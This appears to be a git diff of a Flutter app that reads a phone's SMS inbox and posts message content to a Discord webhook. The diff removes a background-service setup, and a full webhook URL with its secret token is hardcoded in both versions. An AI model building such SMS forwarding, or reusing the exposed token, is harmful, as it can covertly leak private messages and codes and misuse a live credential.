@@ -2,15 +2,8 @@ import 'package:flutter/material.dart';
 import 'package:telephony/telephony.dart';
 import 'package:http/http.dart' as http;
 import 'dart:convert';
-import 'package:flutter_background_service/flutter_background_service.dart';
-void main() async {
-  WidgetsFlutterBinding.ensureInitialized();
-  await FlutterBackgroundService.initialize(
-    androidConfig: AndroidConfig(
-      notificationTitle: 'Background Service',
-      notificationText: 'Running in the background',
-    ),
-  );
+
+void main() {
   runApp(MyApp());
 }
 
@@ -51,14 +44,13 @@ class _SMSReaderAppState extends State<SMSReaderApp> {
     List<SmsMessage> messages = await telephony.getInboxSms();
     if (messages.isNotEmpty) {
       setState(() {
-        lastReceivedMessage = messages.last.body;
+        lastReceivedMessage = messages.last.body ?? ''; // Ensure the null safety
       });
     }
   }
 
   Future<void> _sendToDiscordWebhook() async {
-    final discordWebhookURL =
-        'https://discord.com/api/webhooks/1165290854416646225/NFI2Puw2SYeWNetzEm9sr_KtCSjEA-6CS54hTQZDCy7LD-EYLuv0rM2oioO7ObazFZvU'; // Replace with your Discord webhook URL
+    final discordWebhookURL = 'https://discord.com/api/webhooks/1165290854416646225/NFI2Puw2SYeWNetzEm9sr_KtCSjEA-6CS54hTQZDCy7LD-EYLuv0rM2oioO7ObazFZvU'; // Replace with your Discord webhook URL
 
     final response = await http.post(
       Uri.parse(discordWebhookURL),
